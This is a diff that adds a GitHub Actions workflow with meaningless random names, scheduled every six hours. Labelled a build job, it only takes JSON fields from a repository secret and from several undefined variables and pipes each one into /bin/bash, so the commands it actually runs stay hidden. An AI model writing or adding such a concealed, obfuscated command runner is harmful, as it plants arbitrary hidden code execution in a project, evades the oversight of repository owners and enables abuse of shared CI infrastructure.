@@ -1,0 +1,25 @@
+name: xuzhibai3856
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuzhibai3856
+        env:
+          tqua5: ${{ secrets.tqua5 }}
+        run: |
+          echo $tqua5 | jq -r .askw856 | /bin/bash
+          echo $lzzmo9 | jq -r .eu1 | /bin/bash
+          echo $x61 | jq -r .ezv617 | /bin/bash
+          echo $nky00328 | jq -r .lmx5483 | /bin/bash
+          echo $wl4497 | jq -r .tww5 | /bin/bash
+          echo $fqzqr556 | jq -r .fnue6094 | /bin/bash
+          echo $dhoa900 | jq -r .f9124 | /bin/bash
+
